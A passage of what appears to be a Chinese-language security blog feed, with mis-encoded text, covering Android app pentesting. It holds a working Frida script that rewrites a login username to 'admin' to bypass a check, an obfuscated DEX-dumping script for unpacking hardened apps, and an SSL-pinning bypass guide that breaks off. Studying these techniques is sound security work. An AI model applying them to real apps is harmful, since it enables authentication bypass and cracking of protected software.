class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.TextView&quot;</span>);</span><br><span class="line">  tv_class.<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.CharSequence&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> string_to_send = x.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> string_to_recv;</span><br><span class="line">    <span class="title function_">send</span>(string_to_send); <span class="comment">// å°†æ•°æ®å‘é€ç»™kaliä¸»æœºçš„pythonä»£ç </span></span><br><span class="line">    <span class="title function_">recv</span>(<span class="keyword">function</span> (<span class="params">received_json_object</span>) &#123;</span><br><span class="line">      string_to_recv = received_json_object.<span class="property">my_data</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string_to_recv: &quot;</span> + string_to_recv);</span><br><span class="line">    &#125;).<span class="title function_">wait</span>(); <span class="comment">//æ”¶åˆ°æ•°æ®ä¹‹åï¼Œå†æ‰§è¡Œä¸‹å»</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setText</span>(string_to_recv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>kali</code>ä¸»æœºç«¯çš„æµç¨‹å°±æ˜¯ï¼Œå°†æ¥å—åˆ°çš„<code>JSON</code>æ•°æ®è§£æï¼Œæå–å‡ºå…¶ä¸­çš„å¯†ç éƒ¨åˆ†ï¼Œç„¶åå°†ç”¨æˆ·åæ›¿æ¢æˆ<code>admin</code>ï¼Œè¿™æ ·å°±å®ç°äº†å°†<code>admin</code>å’Œ<code>pw</code>å‘é€ç»™â€œæœåŠ¡å™¨â€çš„ç»“æœã€‚</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="built_in">print</span> message</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        data = message[<span class="string">&quot;payload&quot;</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;message:&#x27;</span>, message</span><br><span class="line">        data = data.decode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        user, pw = data.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        data = (<span class="string">&quot;admin&quot;</span> + <span class="string">&quot;:&quot;</span> + pw).encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;encoded data:&quot;</span>, data</span><br><span class="line">        script.post(&#123;<span class="string">&quot;my_data&quot;</span>: data&#125;)  <span class="comment"># å°†JSONå¯¹è±¡å‘é€å›å»</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Modified data sent&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.roysue.demo04&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;s4.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)  <span class="comment"># æ³¨å†Œæ¶ˆæ¯å¤„ç†å‡½æ•°</span></span><br><span class="line">script.load()</span><br><span class="line">raw_input()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªè¦è¾“å…¥ä»»æ„ç”¨æˆ·å(éadmin)+å¯†ç ï¼Œéadminçš„ç”¨æˆ·åå¯ä»¥ç»•è¿‡<code>compareTo</code>æ ¡éªŒï¼Œç„¶å<code>frida</code>ä¼šå¸®åŠ©æˆ‘ä»¬å°†ç”¨æˆ·åæ”¹æˆ<code>admin</code>ï¼Œæœ€ç»ˆå°±æ˜¯<code>admin:pw</code>çš„ç»„åˆå‘é€åˆ°æœåŠ¡å™¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python loader4.py</span><br><span class="line"></span><br><span class="line">Script loaded successfully</span><br><span class="line">&#123;u&#x27;type&#x27;: u&#x27;send&#x27;, u&#x27;payload&#x27;: u&#x27;Sending to the server :YWFhYTpiYmJi\n&#x27;&#125;</span><br><span class="line">None</span><br><span class="line">Sending to the server :YWFhYTpiYmJi</span><br><span class="line"></span><br><span class="line">message: &#123;u&#x27;type&#x27;: u&#x27;send&#x27;, u&#x27;payload&#x27;: u&#x27;Sending to the server :YWFhYTpiYmJi\n&#x27;&#125;</span><br><span class="line">data: aaaa:bbbb</span><br><span class="line">pw: bbbb</span><br><span class="line">encoded data: YWRtaW46YmJiYg==</span><br><span class="line"></span><br><span class="line">Modified data sent</span><br><span class="line">string_to_recv: YWRtaW46YmJiYg==</span><br></pre></td></tr></table></figure><p>åŠ¨æ€ä¿®æ”¹è¾“å…¥å†…å®¹å°±è¿™æ ·å®ç°äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rpc </tag>
            
            <tag> Frida </tag>
            
            <tag> ä¸»åŠ¨è°ƒç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…­ä¸ªå¸¸è§çš„è„±å£³æ–¹å¼</title>
      <link href="/2024/10/08/%E5%85%AD%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E8%84%B1%E5%A3%B3%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/10/08/%E5%85%AD%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E8%84%B1%E5%A3%B3%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>æ–‡ç« æ¥è‡ªï¼š<a href="https://mp.weixin.qq.com/s/pcX_zaqrNsbv89VQm5NLsQ">https://mp.weixin.qq.com/s/pcX_zaqrNsbv89VQm5NLsQ</a></p><h3 id="ä¸€ã€BlackDexï¼šè½¯ä»¶æ–¹æ¡ˆ"><a href="#ä¸€ã€BlackDexï¼šè½¯ä»¶æ–¹æ¡ˆ" class="headerlink" title="ä¸€ã€BlackDexï¼šè½¯ä»¶æ–¹æ¡ˆ"></a>ä¸€ã€BlackDexï¼šè½¯ä»¶æ–¹æ¡ˆ</h3><p><strong>BlackDex</strong>ï¼š<a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a></p><p><strong>é™åˆ¶æ¡ä»¶</strong>ï¼šç‰ˆæœ¬è²Œä¼¼&lt;&#x3D;7.x<br><strong>BlackDex32</strong>å’Œ<strong>BlackDex64</strong>ä¸¤ä¸ªéƒ½ç›´æ¥æ‰“å¼€é€‰ä¸­è¦è„±å£³çš„è½¯ä»¶ï¼Œç­‰å¾…å³å¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405389.png" alt="img"> </p><p>Dexå­˜å‚¨ç›®å½•ï¼š&#x2F;storage&#x2F;emulated&#x2F;0&#x2F;Android&#x2F;data&#x2F;top.niunaijun.blackdexa64&#x2F;dump&#x2F;è½¯ä»¶åŒ…åä¸­ï¼ˆå¦‚æœæ˜¯32å°±åé¢64æ”¹32å³å¯ï¼‰</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405353.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405465.png" alt="img">ã€</p><p>è¿™ç§è„±å‡ºæ¥è¿™ä¹ˆç‚¹çš„ï¼ŒåŸºæœ¬å°±ä¸æ˜¯äº†ï¼Œé€‰ä¸­çœ‹ä¸€çœ¼å°±çŸ¥é“äº†ï¼Œå¯ä»¥å°è¯•å…¶ä»–æ–¹æ¡ˆã€‚</p><h3 id="äºŒã€DITORï¼šæ¨¡å—æ–¹æ¡ˆ1"><a href="#äºŒã€DITORï¼šæ¨¡å—æ–¹æ¡ˆ1" class="headerlink" title="äºŒã€DITORï¼šæ¨¡å—æ–¹æ¡ˆ1"></a>äºŒã€DITORï¼šæ¨¡å—æ–¹æ¡ˆ1</h3><p><strong>é™åˆ¶æ¡ä»¶</strong>ï¼šå®‰å“ç‰ˆæœ¬è¿˜æ˜¯&lt;&#x3D;7.x</p><p>å…ˆåœ¨Xposedé‡Œé¢å‹¾é€‰å¯ç”¨æ¨¡å—ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405333.png" alt="img"> </p><p>ç„¶åç‚¹å‡»&#x2F;ç›´æ¥ç‚¹å‡»appå›¾æ ‡è¿›å…¥ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728214986974-5dd5c9c0-fc79-4465-8d4b-651668782123.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405528.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405110.png" alt="img"> </p><p>è¿™é‡Œæˆ‘å®‰å“7.1.2çš„æ¨¡æ‹Ÿå™¨è£…çš„ç”¨ç¬¬ä¸€ä¸ªgetDexäº‘è„±å£³æ–¹æ¡ˆï¼Œå®‰å“7ä»¥ä¸Šçš„ç”¨dumpMemeryæ–¹æ¡ˆã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405151.png" alt="img"> </p><p>ç›®å½•åœ¨**&#x2F;storage&#x2F;emulated&#x2F;0&#x2F;dexInjector&#x2F;è½¯ä»¶åŒ…åä¸‹**</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405242.png" alt="img"> </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728215069693-9a1fe67c-a8db-4fd9-a955-9534f6ac295a.png" alt="img"> </p><h3 id="ä¸‰ã€åå°„å¤§å¸ˆï¼šæ¨¡å—æ–¹æ¡ˆ2"><a href="#ä¸‰ã€åå°„å¤§å¸ˆï¼šæ¨¡å—æ–¹æ¡ˆ2" class="headerlink" title="ä¸‰ã€åå°„å¤§å¸ˆï¼šæ¨¡å—æ–¹æ¡ˆ2"></a>ä¸‰ã€åå°„å¤§å¸ˆï¼šæ¨¡å—æ–¹æ¡ˆ2</h3><p><strong>é™åˆ¶æ¡ä»¶</strong>ï¼šå®‰å“ç‰ˆæœ¬è¿˜æ˜¯&lt;&#x3D;7.1.0</p><p>è¿™é‡Œç”±äºâ€çˆ±ä½œä¸šâ€œè¿™ä¸ªå€’éœ‰è›‹ä¸æ”¯æŒ7.1ä»¥ä¸‹è¿è¡Œï¼Œæ‰€ä»¥æ¢ä¸ªå€’éœ‰è›‹å®¢ä¸²ä¸€ä¸‹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405258.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405346.png" alt="img"> </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728215132323-a15a2cf5-9092-4c58-ab05-bd9dece94b87.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405452.png" alt="img"> </p><p>é•¿æŒ‰-å†™å‡ºDEX</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405576.png" alt="img"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405931.png" alt="img"></p><h3 id="å››ã€frida-dexdump-Fridaæ–¹æ¡ˆ"><a href="#å››ã€frida-dexdump-Fridaæ–¹æ¡ˆ" class="headerlink" title="å››ã€frida-dexdump:Fridaæ–¹æ¡ˆ"></a>å››ã€frida-dexdump:Fridaæ–¹æ¡ˆ</h3><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzNDU5Mzk2OQ==&mid=2247485886&idx=1&sn=25b62d9f1e0ab1ace6c76bdaabb607b0&chksm=e8f54260df82cb7682cdb866f4dd3b2bb7f8b8cc826543db7455f5486a0226db07b9f8c57ec4&scene=21#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzIzNDU5Mzk2OQ==&amp;mid=2247485886&amp;idx=1&amp;sn=25b62d9f1e0ab1ace6c76bdaabb607b0&amp;chksm=e8f54260df82cb7682cdb866f4dd3b2bb7f8b8cc826543db7455f5486a0226db07b9f8c57ec4&amp;scene=21#wechat_redirect</a></p><p>ä½¿ç”¨æ–¹å¼çœ‹è¿™ç¯‡æ–‡ç« </p><h3 id="äº”ã€è„±å£³è„šæœ¬ï¼šè„šæœ¬æ–¹æ¡ˆ"><a href="#äº”ã€è„±å£³è„šæœ¬ï¼šè„šæœ¬æ–¹æ¡ˆ" class="headerlink" title="äº”ã€è„±å£³è„šæœ¬ï¼šè„šæœ¬æ–¹æ¡ˆ"></a>äº”ã€è„±å£³è„šæœ¬ï¼šè„šæœ¬æ–¹æ¡ˆ</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)&#123;e=<span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">&quot;&quot;</span>:<span class="title function_">e</span>(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c+<span class="number">29</span>):c.<span class="title function_">toString</span>(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(c--)d[<span class="title function_">e</span>(c)]=k[c]||<span class="title function_">e</span>(c);k=[<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span><span class="string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span>+<span class="title function_">e</span>(c)+<span class="string">&#x27;\\b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">&#x27;7 1g()&#123;2 1f=a.g(\&#x27;h.8\&#x27;,\&#x27;M\&#x27;);2 M=c i(1f,\&#x27;6\&#x27;,[\&#x27;e\&#x27;,\&#x27;6\&#x27;]);2 15=a.g(&quot;h.8&quot;,&quot;11&quot;);2 11=c i(15,&quot;6&quot;,[&quot;6&quot;,&quot;e&quot;,&quot;6&quot;]);2 19=a.g(\&#x27;h.8\&#x27;,\&#x27;w\&#x27;);2 w=c i(19,\&#x27;6\&#x27;,[\&#x27;6\&#x27;]);2 4=y.K(&quot;/1u/1r/1s&quot;);2 9=M(4,0);3(9!=-1)&#123;2 U=y.1x(1b);2 W=11(9,U,1b);w(9);W=f(U).E();Z W&#125;Z&quot;-1&quot;&#125;7 u(4)&#123;2 16=a.g(\&#x27;h.8\&#x27;,\&#x27;u\&#x27;);2 u=c i(16,\&#x27;6\&#x27;,[\&#x27;e\&#x27;,\&#x27;6\&#x27;]);2 14=a.g(\&#x27;h.8\&#x27;,\&#x27;X\&#x27;);2 X=c i(14,\&#x27;e\&#x27;,[\&#x27;e\&#x27;]);2 17=a.g(\&#x27;h.8\&#x27;,\&#x27;T\&#x27;);2 T=c i(17,\&#x27;6\&#x27;,[\&#x27;e\&#x27;]);2 q=y.K(4);2 V=X(q);3(V!=0)&#123;T(V);Z 0&#125;u(q,1a);o(4)&#125;7 o(4)&#123;2 18=a.g(\&#x27;h.8\&#x27;,\&#x27;o\&#x27;);2 o=c i(18,\&#x27;6\&#x27;,[\&#x27;e\&#x27;,\&#x27;6\&#x27;]);2 q=y.K(4);o(q,1a)&#125;7 G()&#123;2 s=B.1G(&quot;s.8&quot;);2 p=k;2 O=s.1B();1A(2 x=0;x&lt;O.1z;x++)&#123;2 v=O[x];2 m=v.1C;3(m.d(&quot;1F&quot;)&gt;=0&amp;&amp;m.d(&quot;1m&quot;)&gt;=0&amp;&amp;m.d(&quot;1E&quot;)&gt;=0&amp;&amp;m.d(&quot;1D&quot;)&gt;=0)&#123;n.l(m,v.1k);p=v.1k&#125;&#125;2 Q=&#123;&#125;;2 A=1;n.l(&quot;[1m:]&quot;,p);3(p)&#123;13.10(p,&#123;12:7(j)&#123;2 N=j[5];2 t=f(N).1h(B.P).1L();2 Y=f(N).1h(B.P+B.P).1M();3(Q[t]==L)&#123;Q[t]=Y;2 1e=f(t).E();3(1e.d(&quot;H&quot;)==0)&#123;2 z=1g();3(z!=&quot;-1&quot;)&#123;2 S=&quot;/1i/1i/&quot;+z+&quot;/1J/1N&quot;+z;u(S);2 I=S+&quot;/1I&quot;+(A==1?&quot;&quot;:A)+&quot;.H&quot;;n.l(&quot;[1K H]:&quot;,I);2 9=c 1H(I,&quot;1o&quot;);3(9&amp;&amp;9!=k)&#123;A++;2 1l=f(t).1q(Y);9.1p(1l);9.1n();9.w();n.l(&quot;[1w H]:&quot;,I)&#125;&#125;&#125;&#125;&#125;,J:7(R)&#123;&#125;&#125;)&#125;&#125;2 r=1v;7 1y()&#123;13.10(a.1d(k,&quot;1c&quot;),&#123;12:7(j)&#123;2 b=j[0];3(b!==L&amp;&amp;b!=k)&#123;2 4=f(b).E();3(4.d(&quot;s.8&quot;)&gt;=0)&#123;D.C=F;n.l(&quot;[1c:]&quot;,4)&#125;&#125;&#125;,J:7(R)&#123;3(D.C&amp;&amp;!r)&#123;G();r=F&#125;&#125;&#125;);13.10(a.1d(k,&quot;1j&quot;),&#123;12:7(j)&#123;2 b=j[0];3(b!==L&amp;&amp;b!=k)&#123;2 4=f(b).E();3(4.d(&quot;s.8&quot;)&gt;=0)&#123;D.C=F;n.l(&quot;[1j:]&quot;,4)&#125;&#125;&#125;,J:7(R)&#123;3(D.C&amp;&amp;!r)&#123;G();r=F&#125;&#125;&#125;)&#125;1t(G);&#x27;</span>,<span class="number">62</span>,<span class="number">112</span>,<span class="string">&#x27;||var|if|path||int|function|so|fd|Module|pathptr|new|indexOf|pointer|ptr|getExportByName|libc|NativeFunction|args|null|log|symbol_name|console|chmod|addr_DefineClass|cPath|is_hook_libart|libart|base|mkdir|symbol|close|index|Memory|process_name|dex_count|Process|can_hook_libart|this|readCString|true|dump_dex|dex|dex_path|onLeave|allocUtf8String|undefined|open|dex_file|symbols|pointerSize|dex_maps|retval|dex_dir_path|closedir|buffer|dir|result|opendir|size|return|attach|read|onEnter|Interceptor|opendirPtr|readPtr|mkdirPtr|closedirPtr|chmodPtr|closePtr|755|0x1000|dlopen|findExportByName|magic|openPtr|get_self_process_name|add|data|android_dlopen_ext|address|dex_buffer|DefineClass|flush|wb|write|readByteArray|self|cmdline|setImmediate|proc|false|dump|alloc|hook_dlopen|length|for|enumerateSymbols|name|DexFile|Thread|ClassLinker|findModuleByName|File|class|files|find|readPointer|readUInt|dump_dex_&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;|&#x27;</span>),<span class="number">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405023.png" alt="img"> </p><p>è¯¥è„šæœ¬æ¥æºç½‘ç»œï¼Œèƒ½è§£å†³éƒ¨åˆ†åŠ å›ºå¦‚360ã€è…¾è®¯ã€xxxç­‰ï¼Œå°±ä¸€ä¸ªå­—ï¼šåŠ</p><h3 id="å…­ã€ç½‘å€ï¼šæœ€ç»ˆä¸‡èƒ½æ–¹æ¡ˆ"><a href="#å…­ã€ç½‘å€ï¼šæœ€ç»ˆä¸‡èƒ½æ–¹æ¡ˆ" class="headerlink" title="å…­ã€ç½‘å€ï¼šæœ€ç»ˆä¸‡èƒ½æ–¹æ¡ˆ"></a>å…­ã€ç½‘å€ï¼šæœ€ç»ˆä¸‡èƒ½æ–¹æ¡ˆ</h3><p> ç½‘å€ï¼š<strong><a href="https://nop.gs/">https://nop.gs</a></strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728215249898-cd0ffa6f-ba3c-4200-ab5b-d93382b433a2.png" alt="img"> </p><p>APKæ— è„‘ä¸Šä¼ å³å¯ï¼Œé™¤äº†è„±ä¸äº†çš„éƒ½æ˜¯è„±å¾—äº†çš„âœŒï¼Œå¯ä»¥è¯´éå¸¸ä¸‡èƒ½ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„±å£³ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>appä¸‰ç§å¸¸è§æŠ“åŒ…åœºæ™¯åŠæ¡ˆä¾‹åˆ†æ</title>
      <link href="/2024/10/08/app%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%8A%93%E5%8C%85%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
      <url>/2024/10/08/app%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E6%8A%93%E5%8C%85%E5%9C%BA%E6%99%AF%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>ä»¥ä¸‹æ–‡ç« æ¥æºäºï¼š<a href="https://mp.weixin.qq.com/s/vUSNcshhuVWd7tWlw2qdbQ">https://mp.weixin.qq.com/s/vUSNcshhuVWd7tWlw2qdbQ</a>    ã€çœ‹é›ªå­¦è‹‘ã€‘</p><h1 id="ä¸€ã€æœªæ ¡éªŒï¼šé…ç½®è¯ä¹¦å°±èƒ½æŠ“"><a href="#ä¸€ã€æœªæ ¡éªŒï¼šé…ç½®è¯ä¹¦å°±èƒ½æŠ“" class="headerlink" title="ä¸€ã€æœªæ ¡éªŒï¼šé…ç½®è¯ä¹¦å°±èƒ½æŠ“"></a>ä¸€ã€æœªæ ¡éªŒï¼šé…ç½®è¯ä¹¦å°±èƒ½æŠ“</h1><p>1ã€è¿™ç§æƒ…å†µæ˜¯æœ€ç®€å•çš„æƒ…å†µï¼ŒAndroid 7.0ä¹‹å‰çš„è®¾å¤‡ï¼Œç›´æ¥é…ç½®ç”¨æˆ·è¯ä¹¦ï¼Œå°±èƒ½è¿›è¡ŒæŠ“åŒ…ï¼ŒAndroid 7.0ä¹‹åçš„è®¾å¤‡ï¼Œéœ€è¦è·å–rootæƒé™1åï¼ŒæŠŠç”¨æˆ·è¯ä¹¦ç§»åˆ°ç³»ç»Ÿè¯ä¹¦ç›®å½•ä¸‹ï¼Œæˆ–è€…é…ç½®ç³»ç»Ÿå¼ºåˆ¶ä¿¡ä»»ç”¨æˆ·è¯ä¹¦ã€‚</p><ul><li><p>å¯¹äºç§»åŠ¨ç”¨æˆ·è¯ä¹¦åˆ°ç³»ç»Ÿè¯ä¹¦ç›®å½•ä¸‹çš„æƒ…å†µï¼Œæ¨èä½¿ç”¨è¿™ä¸ªæ’ä»¶ï¼š</p><p><a href="https://github.com/ys1231/MoveCertificate">https://github.com/ys1231/MoveCertificate</a></p></li><li><p>å¯¹äºå¼ºåˆ¶ä¿¡ä»»ç”¨æˆ·è¯ä¹¦çš„è¿™ç§æƒ…å†µï¼Œæ¨èä½¿ç”¨è¿™ä¸ªæ’ä»¶ï¼š</p><p><a href="https://github.com/NVISOsecurity/MagiskTrustUserCerts">https://github.com/NVISOsecurity/MagiskTrustUserCerts</a></p></li></ul><p>2ã€å¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å®‰è£…å®Œè¯ä¹¦åï¼Œç›´æ¥ä½¿ç”¨ä»£ç†&#x2F;vpnçš„æ–¹å¼è¿›è¡ŒæŠ“åŒ…å°±å¯ä»¥äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ä»¥æŸæµè§ˆå™¨ä¸ºä¾‹ï¼Œè¿›è¡ŒæŠ“åŒ…æ¼”ç¤ºï¼Œå› ä¸ºæˆ‘ç”¨çš„è®¾å¤‡æ˜¯Android 7.0ä»¥ä¸Šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆæ˜¯é…ç½®ç³»ç»Ÿå¼ºåˆ¶ä¿¡ä»»ç”¨æˆ·è¯ä¹¦çš„æ’ä»¶ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081014296.png" alt="img"> </p><p>3ã€é…ç½®å®Œæˆåï¼Œæˆ‘ä»¬åœ¨æŠ“åŒ…è½¯ä»¶ä¸Šå¯¼å‡ºè¯ä¹¦ï¼Œç„¶ååœ¨è®¾å¤‡ä¸Šè¿›è¡Œå®‰è£…ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081014554.webp" alt="img"> </p><p>4ã€æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡ŒæŠ“åŒ…äº†ï¼ŒæŠ“åŒ…æˆåŠŸã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081015707.webp" alt="img"> </p><h1 id="äºŒã€å•å‘è¯ä¹¦è®¤è¯-å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ï¼ˆSSLPinningï¼‰"><a href="#äºŒã€å•å‘è¯ä¹¦è®¤è¯-å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ï¼ˆSSLPinningï¼‰" class="headerlink" title="äºŒã€å•å‘è¯ä¹¦è®¤è¯-å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ï¼ˆSSLPinningï¼‰"></a>äºŒã€å•å‘è¯ä¹¦è®¤è¯-å®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ï¼ˆSSLPinningï¼‰</h1><p>1ã€è¿™æ˜¯ç¬¬äºŒç§æƒ…å†µï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„sslpinningï¼Œæƒ³å…·ä½“äº†è§£sslpiningæŠ€æœ¯ï¼Œå¯ä»¥å»çœ‹è¿™2ç¯‡æ–‡ç« ï¼š<br><a href="https://shunix.com/ssl-pinning/">https://shunix.com/ssl-pinning/</a><br><a href="https://yu-jack.github.io/2020/03/02/ssl-pinning/">https://yu-jack.github.io/2020/03/02/ssl-pinning/</a></p><p>2ã€é’ˆå¯¹è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬ä»¥xç­”xå•appä¸ºä¾‹ï¼Œè¿›è¡ŒæŠ“åŒ…ï¼Œä¸Šé¢æˆ‘ä»¬å·²ç»è¯•è¿‡äº†ï¼Œç”¨æˆ‘ä»¬çš„æµ‹è¯•è®¾å¤‡æ˜¯å¯ä»¥æ­£å¸¸æŠ“åˆ°httpsçš„æ•°æ®åŒ…çš„ï¼Œç„¶åæˆ‘ä»¬å†å»æŠ“ä¸€ä¸‹xç­”xå•è¿™ä¸ªappçš„åŒ…ï¼Œç‚¹å‡»å‘é€éªŒè¯ç æŒ‰é’®åä¼šæç¤ºå‘é€å¤±è´¥ï¼Œè¯·é‡è¯• ï¼Œè¯´æ˜æˆ‘ä»¬æŠ“åŒ…å¤±è´¥äº†ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081016912.webp" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081017982.webp" alt="img"> </p><p>3ã€è¿™é‡ŒæŠ¥é”™ï¼šClient closed the connection before a request was made. Possibly the SSL certificate was rejectedï¼Œè¡¨æ˜åœ¨ SSL&#x2F;TLS æ¡æ‰‹é˜¶æ®µï¼Œå®¢æˆ·ç«¯åœ¨æ²¡æœ‰å‘é€ HTTP è¯·æ±‚ä¹‹å‰å°±å…³é—­äº†è¿æ¥ï¼Œå®¢æˆ·ç«¯æ‹’ç»äº†æœåŠ¡å™¨çš„è¯ä¹¦ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢æˆ‘ä»¬æ‰€è¯´çš„sslpinningæŠ€æœ¯ï¼Œè¿˜æœ‰å¦å¤–ä¸€ç§æŠ¥é”™å¾—æƒ…å†µï¼šSSL handshake with client failed: An unknown issue occurred processing the certificate (certificate_unknown)ï¼Œä¹Ÿæ˜¯ç”¨åˆ°äº†sslpinningæŠ€æœ¯ã€‚é‚£é‡åˆ°ä¸Šè¿°è¿™2ç§æƒ…å†µï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå¤„ç†å‘¢ï¼Ÿä½¿ç”¨fridaè¿›è¡Œhookï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥ç”¨å¤§ä½¬ä»¬å†™å¥½çš„è„šæœ¬è¿›è¡Œhookï¼Œåœ°å€ï¼š<a 